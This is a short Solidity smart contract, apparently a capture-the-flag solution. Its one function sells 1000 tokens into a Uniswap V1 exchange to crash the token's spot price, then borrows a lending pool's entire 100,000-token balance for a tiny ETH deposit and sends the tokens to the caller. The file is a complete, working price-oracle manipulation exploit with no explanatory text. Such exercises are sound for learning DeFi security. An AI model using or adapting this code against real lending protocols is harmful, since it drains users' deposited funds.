// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPool {
    function borrow(uint256 amount, address recipient) external payable;
    function calculateDepositRequired(uint256 amount) external view returns (uint256);
}

interface IUniswapV1Exchange {
    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline)
        external
        payable
        returns (uint256);
}

contract FaultyContract {
    IERC20 immutable token;
    IPool immutable pool;
    IUniswapV1Exchange immutable uniswapExchange;

    uint256 constant PLAYER_TOKENS = 1000 ether;
    uint256 constant POOL_TOKENS = 100000 ether;

    constructor(address _token, address _pool, address _uniswapExchage) {
        token = IERC20(_token);
        pool = IPool(_pool);
        uniswapExchange = IUniswapV1Exchange(_uniswapExchage);
    }

    function firstTimer() external payable {
        // approve uniswap to be able to withdraw this contract's token;
        token.approve(address(uniswapExchange), PLAYER_TOKENS);

        // will transfer the ETH to this contract.
        uniswapExchange.tokenToEthSwapInput(PLAYER_TOKENS, 1, block.timestamp * 2);

        // now buy the pool's token;
        uint256 depositvalue = pool.calculateDepositRequired(POOL_TOKENS);
        pool.borrow{value: depositvalue}(POOL_TOKENS, msg.sender);
    }

    receive() external payable {}
}
